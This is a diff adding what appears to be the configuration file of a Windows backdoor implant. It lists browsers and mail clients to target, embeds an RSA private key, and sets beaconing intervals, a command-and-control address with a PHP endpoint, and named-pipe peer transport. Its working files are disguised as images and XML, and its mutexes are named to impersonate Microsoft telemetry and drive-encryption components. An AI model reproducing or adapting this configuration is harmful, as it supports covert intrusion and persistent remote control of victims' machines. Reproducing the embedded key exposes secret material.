@@ -1,0 +1,67 @@
+[NAME]
+object_id=SOMEUUID
+
+[PROC]
+net_app = outlook.exe,msimn.exe,firefox.exe,opera.exe,chrome.exe,msedge.exe
+
+[CRYPTO]
+rsa_priv = MIIEogIBAAKCAQEAlFncED5AH7RqeN/2P8/VCI1Dv46SHSrIE8yXUOuMYK/u6ZCNnr6YWL5LDURAdp0dlIClbsjxQxpJtK7WgRGO/dkiSlCHKFIKJ7bBHJDMJ7eJGU3N4laxyyo+NzFeJMwEjhdp4QSDXJGZI47ARjnDngs6hCOV11radhCAY9tO/qsLsW8b7hysd/be/cD/8je+WsD2CwyylYAbadMUm96GfOMrI6Q7dA7blrzuIi/pvEm7KL4Jiso/U6Tjv2Yh5j/tg1ileD9m8Dl4mSXkFyyTMxIwOmknJLBVZyP0bSt6PBN3ZWy5n/g8/TedH3hqOxit7cgQB4vg1xFc3sdipvkHMQIDAQABAoIBAAJnB3lRM236rf68dxscHTHA7T1HlyDXIIZcOdca+XBXaQxp8DaHP6WwRJGNGWjSV+L1HQ4Tkv9TMv5fa8819EAy1ACqwoWUo+AgxYqA4yLW22bdgQgOqgfFl1xYIFOC5PqoG77ZI9zL6X7564M3oZiy9dpN+Tno7sDFY6Q6WP0mzFR4oH4tj+4XYcULJMaDQPiItDrgp/LmXEwRwt0L8XI4WFKmxAbpvNXVPEn4HlUKgy5/4ynMQKpVGLNTMFlI3aMHpZ5UBHpofzI6348TeXxsOeEH/1GwmaJrx0Ce8srjCAkKNv2jcwtwCRc6+JzA6adRaTTZP8LvFeAEV7cJdUECgYEAwzjqEjKGu07U4nkml3FAvJdkZzR+eEq6ZYKTcChsVg7SGsbGSK5/qqqTiNXcxwED+0xkiKoRQmcRbjumbmnO2zNGfSDUpnXgM5v4Kq5bZXo5iHfLHe+lCsUGviR58PmTByDQBsVlpqPz0invGim7vAzzQXuM3MT3KxRHHCwM0scCgYEAwolVh3K6ayI5LPppum+XStHAZM7x4z5Q1sOyZGq6l8mdUJrV58Dz6kW2ZDQbGmlhWqG4TF7vETSDSlFIdpaFRXk/q2caUPAkyDDHqiUw4djqbohGeVzxZ34TKQBxrXr8hIMawvg3FflTbJVcU1mtuyYz4FVfrDpChaAoOChO3kcCgYBDLyEO5iiL6ZNF5V+smqMmxAsfoWcsyrrfGFLZNHAkJbGU2Xd/p93zxARGASObsPPH1gB7L9wEuCe9gfXC5dL0iO7nPRcxujtQR4reVWbKw4dtOZzDTqfDzw6E/VSh46H/wAEXc3OKJ75PQ3Mv09Dx5JsKnBRcHcTaJH5caaR4HQKBgDwkQxnl4TYf1XdPT4KA31AVOpqv095CNLHAvJUI3fjxLr5tr/W/FGl39eRSq5Jlw+BGIPkTXGuARZqjOHjZHgiVbJasAFnHdEejtQaoCs23xvo3DTqV/lfVhUzmwz4zyH+bHJnsLPORKjZmkq1+CxTRwbX4DuTq+gfftK9v3rofAoGARzpS/cA7Z41KXa872eZbuS4zG/k8ju+goyL0wR1m4j5cr/EVqFK1BkC3133TJdirMWKCys0qkujpMJ3wg9K/PczbNVeDXajnd45D00vGAU8lZXq0AisdvxAme98tQEb7XmJWM3NWROLq/ppx1nUqTJxXXRoSHU5KzoBrUM9Jlmc=
+
+[TIME]
+user_winmin = 1800000
+user_winmax = 3600000
+sys_winmin = 3600000
+sys_winmax = 3700000
+task_min = 20000
+task_max = 30000
+checkmin = 60000
+checkmax = 70000
+logmin =  60000
+logmax = 120000
+lastconnect=111
+timestop=
+active_con = 900000
+time2task=3600000
+
+[CW_LOCAL]
+quantity = 0
+
+[CW_INET]
+quantity = 1
+address1 = 10.0.2.11:8080:/javascript/view.php
+
+[TRANSPORT]
+system_pipe = dsnap
+spstatus = yes
+adaptable = no
+p2p_client = false
+peer_pipe = \\peerhost\pipe\dsnap
+
+[DHCP]
+server = 135
+
+[LOG]
+logperiod = 7200
+
+[WORKDATA]
+run_task=
+run_task_system=
+
+[LOCATION]
+task_dir = 0511
+log_dir = 2028
+t_cfg_dir = Nlts
+
+[FILE]
+cfg = setuplst.xml
+tsk = workdict.xml
+send = traverse.gif
+elog = bootinfo.dat
+log = history.jpg
+
+[MTX]
+cfg = Global\Microsoft.Telemetry.Configuration
+tsk = Global\DriveEncryptionStd
+send = Global\DriveHealthOverwatch
+elog = Global\Threading.Management.Info
+log = Global\Stream.Halt.Restoration
